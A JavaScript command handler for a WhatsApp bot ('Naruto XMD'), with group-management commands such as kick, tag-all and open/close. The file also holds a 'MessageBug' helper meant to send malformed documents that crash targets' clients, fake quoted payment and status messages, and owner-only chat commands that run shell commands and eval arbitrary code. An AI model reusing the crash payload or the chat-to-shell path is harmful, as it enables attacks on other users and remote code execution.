/* NARUTO
*/
module.exports = async (lubyz, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
let crypto = require('crypto')
const makeid = crypto.randomBytes(3).toString('hex')
const { Client } = require('ssh2');
const quoted = m.quoted ? m.quoted : m
const from = m.key.remoteJid
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await lubyz.decodeJid(lubyz.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await lubyz.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { version } = require("./package.json")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const { Scraper } = require("akiraa-wb");
const Skrep = new Scraper()
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
const plerr = JSON.parse(fs.readFileSync('./all/database/idgrup2.json').toString())
const jangan2 = m.isGroup ? plerr.includes(m.chat) : false
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
// TAMBAHAN

// CONST PREMIUM
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const kontributor = JSON.parse(fs.readFileSync('./all/database/owner.json'))
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
// CEK DATABASE
const isPremium = prem.includes(m.sender)
const { BingImageCreator } = require("./all/bingimg.js");
//=================================//
     // CONST DEV & INFO BOT
const paket = 'VIP'
const pengembang = 'thugkeed'
const bot = 'naruto xmd'
const verup = '1.0.5'
const qloc = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": 'James',
                    "jpegThumbnail": ''
                          }
                        }
                      }

global.mess = {
"done": 'Bug Suksess Terkirim\n> Cek Target Auto C1!',
"sendbug": 'Bug Sedang Diproses\n> Tunggu Selama 1Menit!'
}
 //===============================//
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (target) => {
return lubyz.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Dokumen Negara.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}

let ppuser
try {
ppuser = await lubyz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/zzmm8z.jpg'
}

async function lubyzReply(teks) {
return lubyz.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, title: "｢ ACCESS DENIED ｣", body: "Powered By Lubyz", previewType: "PHOTO"}}}, {quoted: m})
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363351424590490@newsletter`,
newsletterName: `caspa`,
jpegThumbnail: "",
caption: `Powered By james`,
inviteExpiration: Date.now() + 1814400000
}
}}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namaowner}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By Lubyz`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6281572074859:+62 815-7207-4859\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}


switch (command) {
case 'menu': {
await lubyz.sendMessage(from, {react: {text: "🫏", key: m.key}}); await sleep(10)
const text12 = `
NARUTO-XMD BY THUGKEED TECH 
hello there im an automated WhatsApp bot created by james tech for helping you with automated services 
> 𝗶𝗺 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗵𝗲𝗹𝗽
❒ name: Naruto-xmd
❒ owner: Thugkeed Tech
❒ action: ẉ.ceo/james
❒ mode: public

┌┉┉┉┉┉┉┉┉┉┉┉┈┉┉┉┉┉❐
┠┉┉┉ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜┉┉
┇⏣ public
┇⏣ self
┇⏣ addowner
┇⏣ delowner
┇⏣ owner
┇⏣ kick
┇⏣ hidetag
┇⏣ tagall
┇⏣ close
┇⏣ open
┇⏣ script
┇⏣ credits
┇⏣ thanksto
┇⏣ sound1-161
┗┉┉┉┉┉┉┉┉┉┉┉┉┉
 ☄thanks to
┏┅┅┅┅┅┅┅┅┅┅┅┅┅
┇⏣ 𝐓𝐇𝐔𝐆𝐊𝐄𝐄𝐃 𝐓𝐄𝐂𝐇
┕┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉❐
`
 await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/zzmm8z.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "caspa prime",//𝗘𝗗𝗗𝗜𝗧 𝗡𝗔𝗠𝗘
                    newsletterJid: `120363351424590490@newsletter` //𝗗𝗢𝗡𝗧 𝗘𝗗𝗗𝗜𝗧 𝗡𝗘𝗪𝗦𝗟𝗘𝗧𝗧𝗘𝗥 𝗝𝗜𝗗
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `jamestech caspa prime`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://files.catbox.moe/zzmm8z.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029Vb3IiqTL7UVP9A9n0w1x`
                }
            }
        },{ quoted: qloc }
     ),
       await lubyz.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/l8inzd.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: qloc }
     );
}
 break;
        



case "public": {
if (!Access) return lubyzReply(msg.owner)
lubyz.public = true
reply("*bot on public*")
}
break

case "self": {
if (!Access) return lubyzReply(msg.owner)
lubyz.public = false
reply("bot on *Self mode*")
}
break

case "owner": {
lubyz.sendContact(m.chat, [owner], "Contact owner ", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: `https://files.catbox.moe/zzmm8z.jpg`, 
title: `© Copyright ${global.namabot}`, 
renderLargerThumbnail: true, 
sourceUrl: ``, 
mediaType: 1
}}})
}
break
        

 case 'addowner': {
if (!Access) return reply(msg.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} `)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await lubyz.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
kontributor.push(prem1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(kontributor))
reply(`${prem1} Sudah menjadi kontributor!!!`)
lubyz.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://files.catbox.moe/zzmm8z.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qloc})
 }
break;              

  
case "kik": case "kick": case "sulap": {
if (!isGroup) return lubyzReply(msg.group)
if (!isBotAdmin) return lubyzReply(msg.adminbot)
if (!isAdmin && !Access) return lubyzReply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lubyz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => lubyz.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => reply(err.toString()))
} else return reply(example('62xxx/@tag'))}
break
        
case "hidetag": case "ht": case "h": {
if (!Access) return lubyzReply(msg.owner)
if (!isAdmin && !Access) return lubyzReply(msg.admin)
if (!m.quoted && !text) return reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
lubyz.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
        
case "tagall": case "tag": {
if (!Access) return lubyzReply(msg.owner)
if (!isAdmin && !Access) return lubyzReply(msg.admin)
if (!text) return reply(example("Pesannya"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
lubyz.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
          //BASE ORI LUBYZ
//===================================\\
        // AWAL CASE GRUP
case 'tutup': case 'close':{
if (!isGroup) return reply(`Khusus Group`)
if (!Access) return lubyzReply(msg.owner)
if (!isAdmin) return reply('Khusus Admin')
if (!isBotAdmin) return reply(`Bot harus Admin`)

var nomor = m.participant
lubyz.groupSettingUpdate(m.chat, 'announcement')
reply(`Grup ditutup Sementara Oleh Admin🙏\nGrup Akan Dibuka lagi dalam. beberapa saat`)
}
break  

case 'buka': case 'open':{
if (!isGroup) return reply(`Khusus Grup`)
if (!Access) return lubyzReply(msg.owner)
if (!isAdmin) return reply('Khusus Admin')
if (!isBotAdmin) return reply(`Bot harus Admin`)
var nomor = m.participant
lubyz.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Grup Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}
break
 


//====================================\\
      // BASE 𝗖𝗔𝗦𝗣𝗔

 //==============================\\
 case 'credits':{
await lubyz.sendMessage(from, {react: {text: "⏳", key: m.key}}); await sleep(500)
const text12 = `
*THANKS BIG TO!!*
𝗷𝗮𝗺𝗲𝘀
𝗳𝗿𝗶𝗲𝗻𝗱
𝗳𝗿𝗶𝗲𝗻𝗱
𝗳𝗿𝗶𝗲𝗻𝗱

`

await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/zzmm8z.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "NARUTO XMD",
                    newsletterJid: `120363351424590490@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `CASPA PRIME BY JAMES`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://files.catbox.moe/zzmm8z.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029Vb3IiqTLw1x`
                }
            }
        },{ quoted: qloc }
     )
  }
 break;
//===================================//
 
   //BASE JAMES
//===============================// 
      //BASE JAMES
 



//==============================\\ 
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return lubyz.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return lubyz.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
lubyz.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
lubyz.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return lubyz.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return lubyz.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
lubyz.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})//𝗘𝗡𝗝𝗢𝗬 𝗕𝗬 © 𝐓𝐇𝐔𝐆𝐊𝐄𝐄𝐃 𝐓𝐄𝐂𝐇
